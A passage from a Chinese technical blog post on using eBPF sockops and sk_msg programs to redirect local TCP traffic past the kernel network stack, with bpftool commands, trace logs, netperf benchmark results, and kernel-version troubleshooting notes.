bpf_sockops_v4.o</span><br></pre></td></tr></table></figure><h6 id="加载bpf字节码"><a href="#加载bpf字节码" class="headerlink" title="加载bpf字节码"></a>加载bpf字节码</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool prog load bpf_sockops_v4.o "/sys/fs/bpf/bpf_sockops"</span><br><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool cgroup attach "/sys/fs/cgroup/unified/" sock_ops pinned "/sys/fs/bpf/bpf_sockops"</span><br></pre></td></tr></table></figure><h6 id="查看系统中已经加载的所有-BPF-程序"><a href="#查看系统中已经加载的所有-BPF-程序" class="headerlink" title="查看系统中已经加载的所有 BPF 程序"></a>查看系统中已经加载的所有 BPF 程序</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool prog show</span><br><span class="line">2: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-26T08:39:44+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 2,3</span><br><span class="line">3: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-26T08:39:44+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 2,3</span><br><span class="line">4: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-26T08:39:44+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 4,5</span><br><span class="line">5: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-26T08:39:44+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 4,5</span><br><span class="line">6: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-26T08:41:20+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 6,7</span><br><span class="line">7: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-26T08:41:20+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 6,7</span><br><span class="line">18: sock_ops  name bpf_sockops_v4  tag 8fb64d4d0f48a1a4  gpl</span><br><span class="line">loaded_at 2022-01-26T08:59:51+0000  uid 0</span><br><span class="line">xlated 688B  jited 399B  memlock 4096B  map_ids 14</span><br></pre></td></tr></table></figure><h6 id="查看系统中所有的-map"><a href="#查看系统中所有的-map" class="headerlink" title="查看系统中所有的 map"></a>查看系统中所有的 map</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool map show</span><br><span class="line">2: lpm_trie  flags 0x1</span><br><span class="line">key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">3: lpm_trie  flags 0x1</span><br><span class="line">key 20B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">4: lpm_trie  flags 0x1</span><br><span class="line">key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">5: lpm_trie  flags 0x1</span><br><span class="line">key 20B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">6: lpm_trie  flags 0x1</span><br><span class="line">key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">7: lpm_trie  flags 0x1</span><br><span class="line">key 20B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">14: sockhash  name sock_ops_map  flags 0x0</span><br><span class="line">key 24B  value 4B  max_entries 65535  memlock 0B</span><br></pre></td></tr></table></figure><h6 id="查看map的详情"><a href="#查看map的详情" class="headerlink" title="查看map的详情"></a>查看map的详情</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ sudo bpftool -p map show id 14</span><br><span class="line">&#123;</span><br><span class="line">    "id": 14,</span><br><span class="line">    "type": "sockhash",</span><br><span class="line">    "name": "sock_ops_map",</span><br><span class="line">    "flags": 0,</span><br><span class="line">    "bytes_key": 24,</span><br><span class="line">    "bytes_value": 4,</span><br><span class="line">    "max_entries": 65535,</span><br><span class="line">    "bytes_memlock": 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="打印map中的内容"><a href="#打印map中的内容" class="headerlink" title="打印map中的内容"></a>打印map中的内容</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ sudo bpftool -p map dump id 14</span><br><span class="line">[&#123;</span><br><span class="line">        "key": ["0xc0","0xa8","0x13","0x55","0x0a","0x34","0x23","0xa1","0x01","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x16","0x00","0x00","0xc4","0x08","0x00","0x00"</span><br><span class="line">        ],</span><br><span class="line">        "value": &#123;</span><br><span class="line">            "error": "Operation not supported"</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h5 id="具体测试步骤"><a href="#具体测试步骤" class="headerlink" title="具体测试步骤"></a>具体测试步骤</h5><h6 id="执行load-sh脚本"><a href="#执行load-sh脚本" class="headerlink" title="执行load.sh脚本"></a>执行<code>load.sh</code>脚本</h6><p>这里需要根据内核版本对应修改一下<code>load.sh</code>中的代码，如下图所示</p><p><img src="/2022/01/21/浅入浅出eBPF/6.png" alt="6"></p><p>执行结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ ./load.sh </span><br><span class="line">+ set -e</span><br><span class="line">+ sudo mount -t bpf bpf /sys/fs/bpf/</span><br><span class="line">+ clang -O2 -g -target bpf -I/usr/include/linux/ -I/usr/src/linux-headers-5.3.0-40/include/ -c bpf_sockops_v4.c -o bpf_sockops_v4.o</span><br><span class="line">+ sudo bpftool prog load bpf_sockops_v4.o /sys/fs/bpf/bpf_sockops</span><br><span class="line">+ sudo bpftool cgroup attach /sys/fs/cgroup/unified/ sock_ops pinned /sys/fs/bpf/bpf_sockops</span><br><span class="line">++ sudo bpftool prog show pinned /sys/fs/bpf/bpf_sockops</span><br><span class="line">++ grep -o -E 'map_ids [0-9]+'</span><br><span class="line">++ cut -d ' ' -f2-</span><br><span class="line">+ MAP_ID=42</span><br><span class="line">+ sudo bpftool map pin id 42 /sys/fs/bpf/sock_ops_map</span><br><span class="line">+ clang -O2 -g -Wall -target bpf -I/usr/include/linux/ -I/usr/src/linux-headers-5.3.0-40/include/ -c bpf_tcpip_bypass.c -o bpf_tcpip_bypass.o</span><br><span class="line">+ sudo bpftool prog load bpf_tcpip_bypass.o /sys/fs/bpf/bpf_tcpip_bypass map name sock_ops_map pinned /sys/fs/bpf/sock_ops_map</span><br><span class="line">+ sudo bpftool prog attach pinned /sys/fs/bpf/bpf_tcpip_bypass msg_verdict pinned /sys/fs/bpf/sock_ops_map</span><br></pre></td></tr></table></figure><h6 id="确认BPF程序已经被加载进内核"><a href="#确认BPF程序已经被加载进内核" class="headerlink" title="确认BPF程序已经被加载进内核"></a>确认BPF程序已经被加载进内核</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool prog show</span><br><span class="line">18: sock_ops  name bpf_sockops_v4  tag 8fb64d4d0f48a1a4  gpl</span><br><span class="line">loaded_at 2022-01-26T08:59:51+0000  uid 0</span><br><span class="line">xlated 688B  jited 399B  memlock 4096B  map_ids 14</span><br><span class="line">41: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 35,36</span><br><span class="line">42: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 35,36</span><br><span class="line">43: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 37,38</span><br><span class="line">44: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 37,38</span><br><span class="line">45: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 39,40</span><br><span class="line">46: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 39,40</span><br><span class="line">50: sock_ops  name bpf_sockops_v4  tag 8fb64d4d0f48a1a4  gpl</span><br><span class="line">loaded_at 2022-01-27T01:32:15+0000  uid 0</span><br><span class="line">xlated 688B  jited 399B  memlock 4096B  map_ids 42</span><br><span class="line">54: sk_msg  name bpf_tcpip_bypas  tag 550f6d3cfcae2157  gpl</span><br><span class="line">loaded_at 2022-01-27T01:32:16+0000  uid 0</span><br><span class="line">xlated 224B  jited 151B  memlock 4096B  map_ids 42</span><br></pre></td></tr></table></figure><h6 id="查看固定在文件系统上的SOCKHASH映射"><a href="#查看固定在文件系统上的SOCKHASH映射" class="headerlink" title="查看固定在文件系统上的SOCKHASH映射"></a>查看固定在文件系统上的SOCKHASH映射</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo tree /sys/fs/bpf/</span><br><span class="line">/sys/fs/bpf/</span><br><span class="line">├── bpf_sockops</span><br><span class="line">├── bpf_tcpip_bypass</span><br><span class="line">└── sock_ops_map</span><br><span class="line"></span><br><span class="line">0 directories, 3 files</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool map show id 42 -f</span><br><span class="line">42: sockhash  name sock_ops_map  flags 0x0</span><br><span class="line">key 24B  value 4B  max_entries 65535  memlock 0B</span><br></pre></td></tr></table></figure><h6 id="确认应用程序绕过TCP-IP协议栈"><a href="#确认应用程序绕过TCP-IP协议栈" class="headerlink" title="确认应用程序绕过TCP/IP协议栈"></a>确认应用程序绕过TCP/IP协议栈</h6><p>首先打开日志追踪</p><p>root模式下执行如下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir# echo 1 &gt; /sys/kernel/debug/tracing/tracing_on</span><br></pre></td></tr></table></figure><p>接着在shell中对内核实时流跟踪文件trace_pipe进行cat查询，用来监视通过eBPF的TCP通信</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir# cat /sys/kernel/debug/tracing/trace_pipe</span><br><span class="line">          &lt;idle&gt;-0     [001] ..s. 30406.252054: 0: &lt;&lt;&lt; ipv4 op = 4, port 47750 --&gt; 443</span><br><span class="line">          &lt;idle&gt;-0     [001] ..s. 32211.552998: 0: &lt;&lt;&lt; ipv4 op = 4, port 46724 --&gt; 443</span><br><span class="line">          &lt;idle&gt;-0     [001] ..s. 44205.364961: 0: &lt;&lt;&lt; ipv4 op = 4, port 36448 --&gt; 443</span><br><span class="line">          &lt;idle&gt;-0     [000] ..s. 57704.968149: 0: &lt;&lt;&lt; ipv4 op = 4, port 60816 --&gt; 443</span><br></pre></td></tr></table></figure><p>使用socat生成的TCP监听器模拟echo服务器，并使用nc发送连接请求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ sudo socat TCP4-LISTEN:9999,fork exec:cat</span><br><span class="line">root@ubuntu:~$ nc localhost 9999</span><br></pre></td></tr></table></figure><p>随后我们就可以在内核追踪管道中看到在eBPF程序打印的日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir# cat /sys/kernel/debug/tracing/trace_pipe</span><br><span class="line">          &lt;idle&gt;-0     [003] ..s. 61937.626701: 0: &lt;&lt;&lt; ipv4 op = 5, port 22 --&gt; 51324</span><br><span class="line">              nc-4486  [001] .... 61949.838226: 0: &lt;&lt;&lt; ipv4 op = 4, port 43062 --&gt; 9999</span><br><span class="line">              nc-4486  [001] .Ns1 61949.838279: 0: &lt;&lt;&lt; ipv4 op = 5, port 9999 --&gt; 43062</span><br></pre></td></tr></table></figure><h6 id="代码步骤梳理"><a href="#代码步骤梳理" class="headerlink" title="代码步骤梳理"></a>代码步骤梳理</h6><ul><li><code>bpf_sockops_v4.c</code><ul><li>监听<code>socket</code>事件，当事件触发的时候执行</li><li>提取 socket 信息，并以 key &amp; value 形式存储到 sockmap</li></ul></li><li><code>bpf_tcpip_bypass.c</code><ul><li>拦截所有的 <code>sendmsg</code> 系统调用，从消息中提取 key</li><li>根据key查询sockmap，找到这个socket的对端，然后绕过 TCP/IP 协议栈，将数据重定向</li></ul></li></ul><h5 id="网络延迟测试"><a href="#网络延迟测试" class="headerlink" title="网络延迟测试"></a>网络延迟测试</h5><p>使用<code>netperf</code>命令，执行时长参数为60秒的各种请求和响应消息大小，进行延迟测量（分别采用p50、p90 和 p99，其中P50表示中位数。P90表示包含90%的值。P99表示包含99%的值。）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ netserver -p 1000</span><br><span class="line">Unable to start netserver with  'IN(6)ADDR_ANY' port '1000' and family AF_UNSPEC</span><br></pre></td></tr></table></figure><p>这里是因为端口被占用的问题，我们换一个端口即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ sudo netserver -p 9998</span><br><span class="line">Starting netserver with host 'IN(6)ADDR_ANY' port '9998' and family AF_UNSPEC</span><br></pre></td></tr></table></figure><p>执行<code>nperf_latency.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir# ./nperf_latency.sh</span><br></pre></td></tr></table></figure><p>查看结果</p><p>其中第一行和第三行是原生TCP的网络延迟，第二行和第四行是eBPF重定向之后的网络延迟</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ cat result_lat.txt </span><br><span class="line">Req/Resp size: 64 128</span><br><span class="line">45,89,117</span><br><span class="line">17,51,69</span><br><span class="line">46,89,125</span><br><span class="line">26,48,70</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 256</span><br><span class="line">75,101,129</span><br><span class="line">18,48,71</span><br><span class="line">65,101,134</span><br><span class="line">23,58,81</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 512</span><br><span class="line">52,103,139</span><br><span class="line">20,60,85</span><br><span class="line">58,105,143</span><br><span class="line">16,57,77</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 1024</span><br><span class="line">64,109,149</span><br><span class="line">14,58,79</span><br><span class="line">99,113,152</span><br><span class="line">22,63,86</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 2048</span><br><span class="line">79,109,148</span><br><span class="line">23,64,86</span><br><span class="line">73,105,139</span><br><span class="line">25,63,87</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 4096</span><br><span class="line">88,114,144</span><br><span class="line">19,62,81</span><br><span class="line">51,107,144</span><br><span class="line">22,65,90</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 8192</span><br><span class="line">53,110,149</span><br><span class="line">24,69,93</span><br><span class="line">53,114,148</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 16384</span><br><span class="line">58,118,156</span><br><span class="line">98,126,159</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 32768</span><br><span class="line">48,124,157</span><br><span class="line">18,45,104</span><br><span class="line">44,125,158</span><br><span class="line">19,83,111</span><br></pre></td></tr></table></figure><h5 id="网络事务测试"><a href="#网络事务测试" class="headerlink" title="网络事务测试"></a>网络事务测试</h5><p>使用<code>netperf</code>命令来测试60秒运行的各种请求和响应消息大小的事务率：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ ./nperf_trans.sh</span><br></pre></td></tr></table></figure><p>查看结果</p><p>第一行为原生TCP的事务率，第二行是eBPF重定向之后的事务率</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Req/Resp size: 64 128</span><br><span class="line">12.8764</span><br><span class="line">37.7448</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 256</span><br><span class="line">15.4409</span><br><span class="line">26.7399</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 512</span><br><span class="line">19.6885</span><br><span class="line">51.1781</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 1024</span><br><span class="line">19.7911</span><br><span class="line">54.3722</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 2048</span><br><span class="line">16.2438</span><br><span class="line">48.3493</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 4096</span><br><span class="line">17.0712</span><br><span class="line">39.6384</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 8192</span><br><span class="line">19.775</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 16384</span><br><span class="line">14.8864</span><br><span class="line">26.6844</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 32768</span><br><span class="line">12.8528</span><br><span class="line">42.2359</span><br></pre></td></tr></table></figure><h5 id="网络吞吐测试"><a href="#网络吞吐测试" class="headerlink" title="网络吞吐测试"></a>网络吞吐测试</h5><p>使用<code>netserver</code>服务端和<code>netperf</code>客户端进行60秒的各种发送消息大小的吞吐量测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ ./nperf_thruput.sh</span><br></pre></td></tr></table></figure><p>查看结果</p><p>第一行为原生TCP的吞吐量，第二行是eBPF重定向之后的吞吐量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">30 tx=256 rx=256</span><br><span class="line">0.3601</span><br><span class="line">0.66732</span><br><span class="line">60 tx=256 rx=256</span><br><span class="line">0.36194</span><br><span class="line">0.66343</span><br><span class="line"></span><br><span class="line">30 tx=512 rx=512</span><br><span class="line">0.70011</span><br><span class="line">1.35457</span><br><span class="line">60 tx=512 rx=512</span><br><span class="line">0.73094</span><br><span class="line">1.26444</span><br><span class="line"></span><br><span class="line">30 tx=1024 rx=1024</span><br><span class="line">1.16659</span><br><span class="line">2.3709</span><br><span class="line">60 tx=1024 rx=1024</span><br><span class="line">1.05398</span><br><span class="line">2.27725</span><br><span class="line"></span><br><span class="line">30 tx=2048 rx=2048</span><br><span class="line">2.40606</span><br><span class="line">4.071</span><br><span class="line">60 tx=2048 rx=2048</span><br><span class="line">1.91763</span><br><span class="line">4.04238</span><br><span class="line"></span><br><span class="line">30 tx=3072 rx=3072</span><br><span class="line">3.34056</span><br><span class="line">5.38908</span><br><span class="line">60 tx=3072 rx=3072</span><br><span class="line">3.41499</span><br><span class="line">5.47481</span><br></pre></td></tr></table></figure><h5 id="遇到的一些问题"><a href="#遇到的一些问题" class="headerlink" title="遇到的一些问题"></a>遇到的一些问题</h5><h6 id="编译bpftool工具出错"><a href="#编译bpftool工具出错" class="headerlink" title="编译bpftool工具出错"></a>编译bpftool工具出错</h6><p>在<code>/tools/bpf/bpftool</code>目录下执行make时会自动检查系统特征，而对于<code>libbfd</code>库，linux内核为<code>4.x</code>的版本是检测不到的。在<code>5.3</code>版本下会显示<code>on</code></p><h6 id="编译bpf字节码出错"><a href="#编译bpf字节码出错" class="headerlink" title="编译bpf字节码出错"></a>编译bpf字节码出错</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ clang -O2 -g -target bpf -I /usr/include/linux/ -I /usr/src/linux-headers-4.18.0-13/include/ -c bpf_sockops_v4.c  -o bpf_sockops_v4.o</span><br></pre></td></tr></table></figure><p>具体表现在clang编译的时候会报错<code>use of undeclared identifier BPF_XXX</code>，这里需要注意一下，对于bpf中的一些函数也有内核版本的限制，具体的版本可以参考如下链接</p><p>BPF Features by Linux Kernel Version</p><ul><li><a href="https://github.com/delphix/bcc/blob/master/docs/kernel-versions.md" target="_blank" rel="noopener">https://github.com/delphix/bcc/blob/master/docs/kernel-versions.md</a></li></ul><h6 id="加载bpf字节码出错"><a href="#加载bpf字节码出错" class="headerlink" title="加载bpf字节码出错"></a>加载bpf字节码出错</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ ~/linux-4.18.13/tools/bpf/bpftool/./bpftool prog load bpf_sockops_v4.o /sys/fs/bpf/bpf_sockops</span><br><span class="line">libbpf: Program '"sockops"' contains non-map related relo data pointing to section 5</span><br><span class="line">Error: failed to load program</span><br></pre></td></tr></table></figure><p>问题google后发现，可能是低内核版本不支持bpf程序静态全局变量的定义，</p><p><a href="https://stackoverflow.com/questions/48653061/ebpf-global-variables-and-structs" target="_blank" rel="noopener">https://stackoverflow.com/questions/48653061/ebpf-global-variables-and-structs</a></p><h5 id="安装指定版本的Linux内核"><a href="#安装指定版本的Linux内核" class="headerlink" title="安装指定版本的Linux内核"></a>安装指定版本的Linux内核</h5><h6 id="查询当前内核版本"><a href="#查询当前内核版本" class="headerlink" title="查询当前内核版本"></a>查询当前内核版本</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ uname -r</span><br><span class="line">4.18.0-13-generic</span><br></pre></td></tr></table></figure><h6 id="查询当前安装的内核镜像"><a href="#查询当前安装的内核镜像" class="headerlink" title="查询当前安装的内核镜像"></a>查询当前安装的内核镜像</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ dpkg --get-selections |grep linux-image</span><br><span class="line">linux-image-4.15.0-162-genericinstall</span><br><span class="line">linux-image-4.15.0-55-genericdeinstall</span><br><span class="line">linux-image-4.18.0-13-genericinstall</span><br><span class="line">linux-image-genericinstall</span><br></pre></td></tr></table></figure><h6 id="查询指定版本的Linux镜像包"><a href="#查询指定版本的Linux镜像包" class="headerlink" title="查询指定版本的Linux镜像包"></a>查询指定版本的Linux镜像包</h6><p>这里以<code>5.3.0-40</code>版本内核为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ apt-cache search linux| grep 5.3.0-40</span><br><span class="line">linux-buildinfo-5.3.0-40-generic - Linux kernel buildinfo for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-buildinfo-5.3.0-40-lowlatency - Linux kernel 